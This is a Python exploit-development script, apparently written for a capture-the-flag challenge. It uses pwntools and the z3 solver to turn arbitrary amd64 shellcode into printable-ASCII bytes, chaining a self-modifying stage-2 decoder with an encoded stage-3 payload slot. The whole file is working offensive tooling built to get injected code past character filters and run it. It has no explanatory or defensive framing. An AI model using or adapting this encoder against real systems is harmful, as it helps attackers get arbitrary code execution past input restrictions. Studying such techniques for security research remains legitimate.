#!/usr/bin/env python

from pwn import *
from z3 import *
import operator

def is_ok(b):
    return b >= 0x20 and b < 0x7f

def is_ok32(i32):
    return reduce(operator.and_, is_ok_str(p32(i32)))

def is_ok_str(s):
    return map(is_ok, map(ord, s))

def check(shellcode):
    for b in shellcode:
        assert(is_ok(ord(b)))
    return True

# really f--king overkill
s = Solver()
def solve_add_eax(i32):
    s.reset()
    x = BitVec('x', 32)
    variables = []
    for j in range(0, 3):
        variables.append(BitVec('a%d' % (j,), 32))
    expr = x
    for var in variables[0:]:
        expr = expr - var
    s.add(ForAll(x, expr == x + BitVecVal(i32, 32)))
    for var in variables:
        for k in range(0, 32, 8):
            s.add(Extract(k+7, k, var) >= BitVecVal(0x20, 8))
            s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
    if str(s.check()) == 'sat':
        m = s.model()
        return map(int, map(str, map(m.evaluate, variables)))
    else:
        raise ValueError("couldn't solve eax=%08x" %(i32,))

def solve_set_eax(i32):
    s.reset()
    z = BitVec('z', 32)
    variables = [z]
    for j in range(0, 2):
        variables.append(BitVec('a%d' % (j,), 32))
    expr = BitVecVal(0, 32)
    for var in variables[1:]:
        expr = expr - var
    s.add(expr ^ z == BitVecVal(i32, 32))
    for var in variables:
        for k in range(0, 32, 8):
            s.add(Extract(k+7, k, var) >= BitVecVal(0x20, 8))
            s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
    if str(s.check()) == 'sat':
        m = s.model()
        return map(int, map(str, map(m.evaluate, variables)))
    else:
        raise ValueError("couldn't solve eax=%08x" %(i32,))

def solve_set_rax(i64):
    s.reset()
    z = BitVec('z', 64)
    variables = [z]
    for j in range(0, 1):
        variables.append(BitVec('a%d' % (j,), 64))
    expr = z
    for var in variables[1:]:
        expr = expr * var
    s.add(expr == BitVecVal(i64, 64))
    for var in variables:
        for k in range(0, 64, 8):
            s.add(Extract(k+7, k, var) >= BitVecVal(0x20, 8))
            s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
    if str(s.check()) == 'sat':
        m = s.model()
        return map(int, map(str, map(m.evaluate, variables)))
    else:
        raise ValueError("couldn't solve eax=%016x" %(i64,))

def add_eax(i32):
    shellcode = ''
    soln = solve_add_eax(i32)
    for sub in soln:
        shellcode += 'sub eax, 0x%08x\n' % (sub,)
        assert (is_ok32(sub))
    return asm(shellcode, arch='amd64')

def set_eax(i32):
    shellcode = 'push rbx; pop rax;'
    soln = solve_set_eax(i32)
    for sub in soln[1:]:
        shellcode += 'sub eax, 0x%08x\n' % (sub,)
        assert (is_ok32(sub))
    shellcode += 'xor eax, 0x%08x' % (soln[0])
    assert (is_ok32(soln[0]))
    return asm(shellcode, arch='amd64')

# rdi = rax = controlled, r8 and r9 clobbered
def set_rdi(i32):
    return set_eax(i32) + asm('push rax; pop rdi', arch='amd64')

def set_rsi(i32):
    return set_eax(i32) + asm('push rax; pop rsi', arch='amd64')

def add_rdi(i32):
    return asm('push rdi; pop rax;', arch='amd64') + add_eax(i32) + asm('push rax; pop rdi', arch='amd64')

add_rdi_4 = add_rdi(4)

# writes arbitrary 4 bytes at [rdx+offset], rcx, rax, rsi clobbered
# rdi incremented by 4
def write4(i32):
    shellcode = ''

    # zero 4 bytes at rdx+rdi
    shellcode += asm('''
movsx rsi, dword ptr [rdx+rdi]
xor [rdx+rdi], esi
''', arch='amd64')
    
    shellcode += set_eax(i32)

    # [rdx+rdi] = rsi = [rcx] = rax
    shellcode += asm('''
push rax
pop rsi
xor [rdx+rdi], esi
''', arch='amd64')

    shellcode += add_rdi_4

    return shellcode

def xlate(stage2, stage3):
    # rdx = ptr to shellcode DON'T CLOBBER ME, i know where you live
    payload = ''

    # zero rsi and rax, clobber r8 and r9
    payload += asm('''
push rsp
pop r9
pop r8
push rsi
xor rsi, [r9]
push rsi
pop rax
''', arch='amd64') # zero eax
    payload += asm('push rax; push rax; pop rbx; pop rdi;', arch='amd64') # save zero in rbx for later uses

    for i in range(0, len(stage2), 4):
        frag = stage2[i:i+4]
        xlate_frag = write4(u32(frag))
        payload += xlate_frag
        print '%s => %s' % (frag.encode('hex'), xlate_frag.encode('hex'))

    stage3_thunk = ''
    for i in range(0, len(stage3), 8):
        frag = stage3[i:i+8]
        xlate_frags = map(p64, solve_set_rax(u64(frag)))
        print '%s =>' % (frag.encode('hex'),),
        for xlate_frag in xlate_frags:
            stage3_thunk += xlate_frag
            print xlate_frag.encode('hex'),
        print

    len_set_rdi = len(set_rdi(0xdeadbeef))
    len_write4 = len(write4(0xdeadbeef))

    # assemble args for and jump to stage2
    offset_of_jump = len(payload) + len_set_rdi + len_write4 + 2 * len_set_rdi
    print "Jump at +%d\n" % (offset_of_jump,)
    payload += set_rdi(offset_of_jump) # point to jmp instruction location
    payload += write4(u32(asm('jmp rdx; nop; nop;', arch='amd64')))

    payload += set_rsi(offset_of_jump + 4) # point to stage3 thunk
    payload += set_rdi(len(stage2)) # point to after stage2
    payload += 'AAAA' # gets overwritten by jmp
    payload += stage3_thunk

    return payload

stage2 = asm('''
loop:
mov rax, qword ptr [rdx+rsi]
imul rax, qword ptr [rdx+rsi+8]
mov qword ptr [rdx+rdi], rax
add edi, 8
add esi, 16
test eax,eax
jnz loop
''', arch='amd64')
stage2 += '\x90' * (-len(stage2) % 4) # pad

stage3 = asm('''
/* your shellcode here o_O */
''', arch='amd64')
stage3 += '\x90' * (-len(stage3) % 8) # pad

payload = xlate(stage2, stage3)

assert is_ok_str(payload)
print len(payload)

print payload
open('shellcode.txt', 'wb').write(payload)
